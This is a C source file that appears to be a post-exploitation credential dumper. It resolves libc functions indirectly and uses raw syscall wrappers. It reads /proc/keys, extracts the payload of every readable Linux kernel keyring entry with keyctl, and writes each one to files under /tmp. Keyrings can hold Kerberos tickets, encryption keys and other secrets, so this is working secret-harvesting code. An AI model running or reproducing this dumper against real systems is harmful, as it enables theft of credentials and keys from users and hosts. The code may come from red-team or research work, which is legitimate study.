#include "libc_d.h"
#include "print.h"
#include "log.h"
#include "syscall_z.h"
#define _GNU_SOURCE
#include <asm/unistd.h>
#include <dirent.h>
#include <fcntl.h>
#include <linux/keyctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

closedir_f closedir_d = NULL;
dirfd_f dirfd_d = NULL;
fclose_f fclose_d = NULL;
free_f free_d = NULL;
fopen_f fopen_d = NULL;
getline_f getline_d = NULL;
malloc_f malloc_d = NULL;
opendir_f opendir_d = NULL;
sscanf_f sscanf_d = NULL;
sprintf_f sprintf_d = NULL;
time_f time_d = NULL;

#define RESOLVE_FUNCTION(func)                     \
    func##_d = func##_s();                         \
    if(!func##_d) {                                \
        PRINTF("Error resolving " #func "\n");     \
        return -1;                                 \
    }

int resolve_functions() {
    RESOLVE_FUNCTION(closedir)
    RESOLVE_FUNCTION(dirfd);
    RESOLVE_FUNCTION(fclose);
    RESOLVE_FUNCTION(fopen);
    RESOLVE_FUNCTION(free);
    RESOLVE_FUNCTION(getline);
    RESOLVE_FUNCTION(malloc);
    RESOLVE_FUNCTION(opendir);
    RESOLVE_FUNCTION(sscanf);
    RESOLVE_FUNCTION(sprintf);
    return 0;
}

int read_key(unsigned long k_id, char **data, size_t *size) {
  int rerr = -1;
  char *data_local = NULL;
  long size_local = syscall_z(__NR_keyctl, KEYCTL_READ, k_id, 0, 0);
  if (size_local < 0) {
    goto close;
  }

  data_local = malloc_d(size_local);
  if (!data_local) {
    goto close;
  }

  size_local = syscall_z(__NR_keyctl, KEYCTL_READ, k_id, data_local, size_local);
  if (size_local < 0) {
    goto close;
  }

  *data = data_local;
  data_local = NULL;
  *size = size_local;

  rerr = 0;
close:
  if (data_local) {
    free_d(data_local);
  }
  return rerr;
}

int write_to_file(int dir_fd, const char *pathname, const char *data,
                  size_t data_size) {
  int fd = 0;
  int rerr = -1;

  fd = openat_z(dir_fd, pathname, O_CREAT | O_WRONLY, 0664);
  if (fd < 0) {
    goto close;
  }

  if (write_z(fd, data, data_size) < 0) {
    goto close;
  }

  rerr = 0;
close:
  if (fd >= 0) {
    close_z(fd);
  }
  return rerr;
}


char* extract_description(char* line) {
    int field = 0;
    char previous = ' ';

    for(;*line;line++) {
        if(*line != ' ' && previous == ' ') {
            field++;
            if (field == 9) {
                return line;
            }
        }
        previous = *line;
    }

    return NULL;
}

int is_letter(char c) { return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'); }

int is_digit(char c) {
    return c >= '0' && c <= '9';
}

void normalize_description(char* desc) {
    int i;
    for(i = 0;i < 30 && desc[i];i++) {
        if(!(is_letter(desc[i]) || is_digit(desc[i]))){
            desc[i] = '_';
        }
    }
    desc[i] = 0;

    // If the last characters are underscores, ignore them
    for(;i >= 0;i--) {
        if(desc[i] == '_' || desc[i] == 0) {
            desc[i] = 0;
        } else {
            break;
        }
    }
}

int dump_keys() {
    FILE *fp = NULL;
    char *line = NULL;
    size_t len = 0;
    ssize_t nread;
    unsigned long k_id = 0;
    char k_filename[300] = { 0 };
    int k_state = 0;
    char k_flags[8] = { 0 };
    char k_expiration[20] = { 0 };
    char k_type[20] = { 0 };
    unsigned int k_perms = 0;
    int k_uid = 0;
    int k_gid = 0;
    char* key_data = NULL;
    size_t key_data_size = 0;
    int rerr = -1;
    int err = 0;
    pid_t tid = gettid_z();
    char keys_dir[64] = { 0 };
    DIR* dp = NULL;
    int dir_fd = 0;
    char* desc = NULL;

    sprintf_d(keys_dir, "/tmp/k_%d", tid);
    err = mkdir_z(keys_dir, 0755);
    if (err != 0 && err != -EEXIST) {
        LOG_PRINTF("Error mkdir: %d\n", err);
        goto close;
    }

    dp = opendir_d(keys_dir);
    if(!dp) {
        PRINTF("Error opendir");
        goto close;
    }
    dir_fd = dirfd_d(dp);

    fp = fopen_d("/proc/keys", "r");
    if(!fp) {
        PRINTF("Error opening /proc/keys");
        goto close;
    }

    while ((nread = getline_d(&line, &len, fp)) != -1) {
        sscanf_d(line, "%lx %s %d %s %x %d %d %s", &k_id, k_flags, &k_state, k_expiration, &k_perms, &k_uid, &k_gid, k_type);
        if(read_key(k_id, &key_data, &key_data_size) == 0){
            desc = extract_description(line);
            if(!desc) {
                desc = "";
            }
            // printf("%s\n", desc);
            normalize_description(desc);
            // printf("Key len of %lu\n", key_data_size);
            sprintf_d(k_filename, "%lx_%s_%s", k_id, k_type, desc);
            write_to_file(dir_fd, k_filename, key_data, key_data_size);
            free_d(key_data);
        }
    }

    rerr = 0;
  close:
    if(line) {
        free_d(line);
    }
    if(fp) {
        fclose_d(fp);
    }
    if(dp) {
        closedir_d(dp);
    }

    return rerr;
}


int main() {
    if (resolve_functions() != 0) {
        PRINTF("Unable to resolve functions");
        return -1;
    }
    if(dump_keys()) {
        PRINTF("Unable to dump keys");
        return -1;
    }

    // For debugging
    PRINTF("Malloc Addr: %p\n", malloc_s());
    PRINTF("Malloc addr: %p\n", malloc);
}
